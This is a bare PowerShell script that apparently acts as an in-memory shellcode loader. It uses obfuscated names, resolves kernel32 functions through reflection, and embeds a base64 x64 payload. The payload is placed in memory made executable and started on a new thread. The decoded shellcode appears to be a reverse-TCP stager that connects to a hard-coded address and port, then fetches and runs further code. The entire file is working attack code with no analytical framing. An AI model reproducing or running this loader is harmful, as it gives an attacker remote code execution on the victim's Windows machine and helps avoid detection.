function urg {
        Param ($x7, $zBH)
        $wLLcB = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $wLLcB.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($wLLcB.GetMethod('GetModuleHandle')).Invoke($null, @($x7)))), $zBH))
}

function svcU {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $wKIxn,
                [Parameter(Position = 1)] [Type] $sw = [Void]
        )

        $bFyWj = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $bFyWj.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $wKIxn).SetImplementationFlags('Runtime, Managed')
        $bFyWj.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $sw, $wKIxn).SetImplementationFlags('Runtime, Managed')

        return $bFyWj.CreateType()
}

[Byte[]]$mkuA = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSUVZlSItSYEiLUhhIi1IgTTHJSA+3SkpIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8QVFIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGFBEi0AgSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFRCp4DA0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
[Uint32]$miS = 0
$cP = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((urg kernel32.dll VirtualAlloc), (svcU @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $mkuA.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($mkuA, 0, $cP, $mkuA.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((urg kernel32.dll VirtualProtect), (svcU @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($cP, [Uint32]$mkuA.Length, 0x10, [Ref]$miS)) -eq $true) {
        $voWO = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((urg kernel32.dll CreateThread), (svcU @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$cP,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((urg kernel32.dll WaitForSingleObject), (svcU @([IntPtr], [Int32]))).Invoke($voWO,0xffffffff) | Out-Null
}